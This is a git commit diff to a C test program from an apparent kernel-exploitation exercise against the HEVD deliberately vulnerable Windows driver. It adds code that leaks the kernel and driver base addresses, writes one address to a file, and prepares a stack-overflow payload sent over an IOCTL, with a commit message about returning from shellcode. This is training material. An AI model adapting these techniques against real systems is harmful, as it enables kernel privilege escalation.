489be489d6e65e2154ff4a8c97fd59d088c8071f
edcod3 <31140082+edcod3@users.noreply.github.com>
2022-01-07 01:27:32 +0100

    Updated testExec: LPVOID to String
    testExec now gets the base address of the kernel & the HEVD driver.
    The LPVOID pointer to HEVD is also converted to a string. The HEVD
    base address can be used to get the address of any function in the HEVD
    driver. A HEVD function address could be added to the shellcode to
    return to HEVD!IrpDeviceIoCtlHandler.

--- stackoverflow/testExec.c
+++ stackoverflow/testExec.c
@@ -7,19 +7,71 @@
 #define IOCTL_CODE 0x222003
 
 // Get base of ntoskrnl.exe
-LPVOID GetNTOsBase()
+LPVOID *GetNTOsBase()
 {
     LPVOID Bases[0x1000];
     DWORD needed = 0;
-    LPVOID krnlbase = NULL;
+    LPVOID *baseAddresses = malloc(16);
     if (EnumDeviceDrivers(Bases, sizeof(Bases), &needed))
     {
-        krnlbase = Bases[0];
+        baseAddresses[0] = Bases[0];
+        /*
+        //Enumerate all driver base address until HEVD driver base
         for (int i=0;i<sizeof(Bases);i++) {
             printf("Driver %d: %p\n", i, Bases[i]);
-        }
+        }*/
+        baseAddresses[1] = Bases[97];
     }
-    return krnlbase;
+    return baseAddresses;
+}
+
+int writeToFile(char *fileData)
+{
+    FILE *filePtr;
+    size_t countWritten;
+
+    filePtr = fopen("C:\\Users\\hevd\\Desktop\\TestHevdBaseAddress.dat", "wb");
+    if (!filePtr)
+    {
+        printf("Failed to create file handle :(\n");
+        return 0;
+    }
+    countWritten = fwrite(fileData, sizeof(fileData), 1, filePtr);
+    fclose(filePtr);
+    if (!countWritten)
+    {
+        printf("Failed to write data :(\n");
+        return 0;
+    }
+
+    return 1;
+}
+
+char *lpvoidToStr(LPVOID inputPtr)
+{
+    int intPtr = (int)inputPtr;
+    char hexByteStr[2];
+    int hexByte;
+
+    char *ptrStr = malloc(4);
+    char ptrHexStr[8];
+    sprintf(ptrHexStr, "%0x", intPtr);
+
+    //printf("ptrHexStr: %s\n", ptrHexStr);
+    //printf("intPtr: 0x%x\n", intPtr);
+
+    int j = 0;
+    for (int i = 0; i < strlen(ptrHexStr); i += 2)
+    {
+        strncpy(hexByteStr, ptrHexStr + i, 2);
+        //printf("Hexbyte string (%d): %s\n", j, hexByteStr);
+        hexByte = strtol(hexByteStr, NULL, 16);
+        //printf("Hexbyte (%d): %d\n", j, hexByte);
+        ptrStr[j] = (char)hexByte;
+        j++;
+    }
+
+    return ptrStr;
 }
 
 int main()
@@ -34,12 +86,31 @@ int main()
         exit(-1);
     }
 
-    LPVOID ntoskrnl_base = GetNTOsBase();
+    LPVOID *baseAddresses = GetNTOsBase();
+    if (!baseAddresses[0] && !baseAddresses[1])
+    {
+        printf("Failed to get base addresses :(\n");
+    }
+    LPVOID ntoskrnlBase = baseAddresses[0];
+    LPVOID hevdBase = baseAddresses[1];
+
+    char *hevdBaseStr = lpvoidToStr(hevdBase);
+
+    printf("[*] Kernel base address: 0x%p\n", ntoskrnlBase);
+    printf("[*] HEVD driver base address: 0x%p\n", hevdBase);
+
+    int fileWritten = writeToFile(hevdBaseStr);
+    if (!fileWritten)
+    {
+        printf("Failed to write file :(\n");
+    }
+    //Hexdump command (Powershell): Format-Hex .\TestHevdBaseAddress.dat
+    printf("[*] Wrote HEVD driver string to file: %s\n", hevdBaseStr);
 
     //variable for DeviceIoControl->lpBytesReturned parameter
     DWORD bytesRtrnd;
 
-    printf("Setting up payload!\n");
+    printf("[*] Setting up test payload!\n");
 
     //Overflow Buffer in HEVD
     char payload[69];
@@ -89,6 +160,10 @@ int main()
     nt!IofCallDriver+0x48:
     83870038 5e              pop     esi
     */
+    //Free used heap allocations
+    free(baseAddresses);
+    free(hevdBaseStr);
 
+    //Close handle to HEVD driver
     CloseHandle(drivObjHndl);
 }
